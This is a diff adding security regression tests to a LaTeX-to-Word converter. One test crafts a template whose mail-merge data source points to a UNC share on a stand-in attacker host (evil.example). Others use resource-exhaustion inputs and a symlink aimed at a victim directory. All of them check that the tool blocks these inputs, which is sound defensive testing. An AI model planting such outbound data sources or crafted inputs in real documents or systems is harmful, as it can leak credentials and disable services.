@@ -1333,3 +1333,126 @@ def test_build_limits_its_own_process_and_reports_when_it_cannot(tmp_path, monke
     res = build(src, no_harvest=True, log=lambda *_: None)
     assert calls and any("could not limit the tool's own process: memory 4 GiB (test)" in e.message for e in res.audit.entries)
     assert sandbox.limit_self.__name__ == "<lambda>"  # the real one is exercised by test_tool_process_has_memory_and_cpu_limits
+
+
+# ---- seventh review round ------------------------------------------------------------------------
+
+def test_mail_merge_source_and_mergefields_do_not_survive_the_template(tmp_path):
+    """N14: MERGEFIELD in the header plus a w:mailMerge data source would make Word connect on update."""
+    import docx
+    from docx.oxml import parse_xml
+
+    W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
+    tpl = tmp_path / "template.docx"
+    d = docx.Document()
+    p = d.sections[0].header.paragraphs[0]
+    p.text = "Dear "
+    for xml in (f'<w:r {W}><w:fldChar w:fldCharType="begin"/></w:r>',
+                f'<w:r {W}><w:instrText xml:space="preserve"> MERGEFIELD Name </w:instrText></w:r>',
+                f'<w:r {W}><w:fldChar w:fldCharType="separate"/></w:r>', f'<w:r {W}><w:t>«Name»</w:t></w:r>',
+                f'<w:r {W}><w:fldChar w:fldCharType="end"/></w:r>'):
+        p._p.append(parse_xml(xml))
+    d.save(str(tpl))
+    mm = (b'<w:mailMerge><w:mainDocumentType w:val="formLetters"/><w:dataType w:val="database"/>'
+          b'<w:dataSource r:id="rIdMM"/></w:mailMerge>')
+    rel = (b'<Relationship Id="rIdMM" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/mailMergeSource" '
+           b'Target="file:///\\\\evil.example\\share\\data.mdb" TargetMode="External"/>')
+    with zipfile.ZipFile(tpl) as z:
+        settings = z.read("word/settings.xml")
+        has_rels = "word/_rels/settings.xml.rels" in z.namelist()
+    r_ns = b'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"'
+    first_child = settings.index(b">", settings.index(b"<w:settings")) + 1
+    patched = settings[:first_child] + mm + settings[first_child:]
+    if r_ns not in patched:
+        patched = patched.replace(b"<w:settings ", b"<w:settings " + r_ns + b" ", 1)
+    replace = {"word/settings.xml": [(settings, patched)]}
+    add = {}
+    if has_rels:
+        replace["word/_rels/settings.xml.rels"] = [(b"</Relationships>", rel + b"</Relationships>")]
+    else:
+        add["word/_rels/settings.xml.rels"] = (b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships '
+                                               b'xmlns="http://schemas.openxmlformats.org/package/2006/relationships">' + rel + b"</Relationships>")
+    _rezip(tpl, replace, add)
+    src = _write(tmp_path)
+    res = build(src, reference_doc=tpl, no_harvest=True, log=lambda *_: None)
+    assert res.check.ok, res.check.errors
+    z = zipfile.ZipFile(tmp_path / "main.docx")
+    blob = b"".join(z.read(n) for n in z.namelist())
+    assert b"mailMerge" not in blob and b"evil.example" not in blob and b"MERGEFIELD" not in blob
+    headers = "".join(z.read(n).decode() for n in z.namelist() if n.startswith("word/header"))
+    assert "Dear" in headers
+
+
+def test_cross_including_files_do_not_fan_out(tmp_path):
+    """N18: 12 files that each \\input all the others are O(N!) chains; the inclusion budget stops it."""
+    names = [f"part{i}" for i in range(12)]
+    for n in names:
+        (tmp_path / f"{n}.tex").write_text("".join(f"\\input{{{m}}}\n" for m in names) + f"text of {n}\n")
+    src = _write(tmp_path, "\\documentclass{article}\n\\begin{document}\n" + "".join(f"\\input{{{m}}}\n" for m in names)
+                 + "\\end{document}\n")
+    pf = _bounded(lambda: preflight(src, need_build_files=False), 60)
+    assert any("million characters included" in i or "\\input files" in i for i in pf.issues), pf.issues[:3]
+
+
+def test_column_multiplier_is_bounded():
+    from texdocxdrafter.parser.tables import MAX_COLUMNS, parse_colspec
+
+    cols = _bounded(lambda: parse_colspec("*{999999999}{l}"), 30)
+    assert len(cols) == MAX_COLUMNS
+    assert len(parse_colspec("*{3}{lc}|r")) == 7
+
+
+def test_keep_work_never_follows_a_symlink_at_work(tmp_path):
+    """N20: main.texdocxdrafter/work -> elsewhere: the target is neither deleted nor written into."""
+    victim = tmp_path / "victim"
+    victim.mkdir()
+    (victim / WORK_MARKER).write_text("looks like ours")
+    (victim / "precious.txt").write_text("keep me")
+    src = _write(tmp_path)
+    cfg = tmp_path / "main.texdocxdrafter"
+    cfg.mkdir()
+    (cfg / "work").symlink_to(victim)
+    build(src, no_harvest=True, keep_work=True, log=lambda *_: None)
+    assert (victim / "precious.txt").read_text() == "keep me" and (cfg / "work").is_symlink()
+    assert [p for p in cfg.iterdir() if p.name.startswith("work-")]
+
+
+def test_tree_helpers_do_not_recurse_without_bound():
+    """N21: walk_tree is iterative; a bbl optional argument with thousands of nested braces is read."""
+    from texdocxdrafter.bbl import _balanced
+    from texdocxdrafter.parser.model import Text, walk_tree
+
+    deep = Text(text="leaf")
+    for _ in range(5000):
+        deep = [deep]
+    seen = []
+    walk_tree(deep, seen.append)
+    assert len(seen) == 1
+    inner, end = _balanced("[" + "{" * 5000 + "x" + "}" * 5000 + "]tail", 0, "[", "]")
+    assert inner.endswith("x" + "}" * 5000) and end == 10003
+
+
+def test_thousands_of_declarations_in_a_row_convert(tmp_path):
+    """N22: consecutive \\bfseries no longer copies the tail each time nor nests without bound."""
+    src = _write(tmp_path, "\\documentclass{article}\n\\begin{document}\n" + "\\bfseries " * 5000 + "bold at last\n\\end{document}\n")
+    res = _bounded(lambda: build(src, no_harvest=True, no_tikz=True, log=lambda *_: None), 60)
+    assert res.check.ok, res.check.errors
+    assert "bold at last" in _docx_xml(tmp_path / "main.docx")
+
+
+def test_cli_reports_unmet_process_limits_for_every_command(tmp_path, monkeypatch, capsys):
+    from texdocxdrafter.cli import main
+
+    monkeypatch.setattr(sandbox, "limit_self", lambda *a, **k: ["memory 4 GiB (test)"])
+    src = _write(tmp_path)
+    assert main(["parse", str(src), "--facts"]) == 0
+    assert "could not limit the tool's own process: memory 4 GiB (test)" in capsys.readouterr().err
+
+
+def test_timeout_option_has_an_upper_bound(tmp_path, capsys):
+    from texdocxdrafter.cli import MAX_TIMEOUT, main
+
+    src = _write(tmp_path)
+    with pytest.raises(SystemExit) as exc:
+        main(["build", str(src), "--timeout", str(MAX_TIMEOUT + 1)])
+    assert exc.value.code == 2 and "between 1 and" in capsys.readouterr().err
